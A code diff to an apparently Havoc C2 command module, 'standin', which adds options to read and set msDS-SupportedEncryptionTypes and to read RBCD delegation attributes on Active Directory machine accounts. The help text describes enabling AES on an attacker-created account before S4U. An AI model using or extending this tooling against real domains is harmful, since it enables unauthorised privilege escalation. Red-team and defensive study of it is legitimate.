@@ -42,6 +42,7 @@ def standin_cmd(demonID, *param):
         "--domain":   (str, ""),
         "--user":     (str, ""),
         "--pass":     (str, ""),
+        "--enctypes": (str, ""),
     }
     values, err = _parse_flags(param, flags)
     if err:
@@ -54,8 +55,9 @@ def standin_cmd(demonID, *param):
     domain   = values["--domain"]
     user     = values["--user"]
     passw    = values["--pass"]
+    enctypes = values["--enctypes"]
 
-    bools = [p for p in param if p in ("--make", "--disable", "--delete", "--remove", "--access")]
+    bools = [p for p in param if p in ("--make", "--disable", "--delete", "--remove", "--access", "--enc", "--rbcd")]
     if "--make" in bools:
         mode, opname = 0, "create machine account"
     elif "--disable" in bools:
@@ -68,12 +70,18 @@ def standin_cmd(demonID, *param):
         mode, opname = 4, "remove msDS-AllowedToActOnBehalfOfOtherIdentity"
     elif obj and "--access" in bools:
         mode, opname = 6, "list object access permissions"
+    elif "--rbcd" in bools:
+        mode, opname = 9, "read msDS-AllowedToActOnBehalfOfOtherIdentity"
+    elif "--enc" in bools:
+        mode, opname = 7, "read msDS-SupportedEncryptionTypes"
+    elif enctypes:
+        mode, opname = 8, "set msDS-SupportedEncryptionTypes"
     elif obj:
         mode, opname = 5, "fetch object SID"
     else:
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
             "Usage:\n"
-            "  standin --computer <name> --make | --disable | --delete | --sid <SID> | --remove\n"
+            "  standin --computer <name> --make | --disable | --delete | --sid <SID> | --remove | --enc | --enctypes <N>\n"
             "  standin --object <ldap-filter> [--access]\n"
             "  [--domain <d> --user <u> --pass <p>]")
         return False
@@ -93,12 +101,17 @@ def standin_cmd(demonID, *param):
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "--sid is required for the RBCD set operation")
         return False
 
+    if mode == 8 and not enctypes:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--enctypes <N> is required (28 = RC4+AES128+AES256)")
+        return False
+
     packer.addint(mode)
     packer.addstr(target)
     packer.addstr(sid)
     packer.addstr(domain)
     packer.addstr(user)
     packer.addstr(passw)
+    packer.addstr(enctypes)
 
     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {opname} '{target}'")
     demon.InlineExecute(TaskID, "go", "bin/standin.x64.o", packer.getbuffer(), False)
@@ -130,6 +143,14 @@ STANDIN_HELP = (
     "      Read the object's DACL and flag which principals hold the\n"
     "      RBCD-enabling rights (GenericAll/GenericWrite/WriteDacl/\n"
     "      WriteOwner/WriteProperty).\n"
+    "  standin --computer <name> --enc\n"
+    "      Read msDS-SupportedEncryptionTypes and print which Kerberos\n"
+    "      etypes (RC4/AES128/AES256) the account supports. Unset means\n"
+    "      RC4-only -> AES256 S4U fails with KDC_ERR_ETYPE_NOTSUPP.\n"
+    "  standin --computer <name> --enctypes <N>\n"
+    "      Set msDS-SupportedEncryptionTypes. 28 = RC4+AES128+AES256.\n"
+    "      24 = AES128+AES256 (RC4 off). Use this to enable AES on a\n"
+    "      machine account you created out-of-band before running S4U.\n"
     "\n"
     "OPTIONAL (alternate credentials / target domain):\n"
     "  --domain <d>  Domain (NetBIOS or DNS). Selects the DC; with --user/\n"
@@ -141,6 +162,8 @@ STANDIN_HELP = (
     "  standin --computer Innsmouth --make\n"
     "  standin --object samaccountname=Innsmouth$\n"
     "  standin --object samaccountname=HWKSTN2$ --access\n"
+    "  standin --computer HackerPC --enc\n"
+    "  standin --computer HackerPC --enctypes 28\n"
     "  standin --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543-2611\n"
     "  standin --computer Providence --remove\n"
     "  standin --computer Arkham --disable\n"
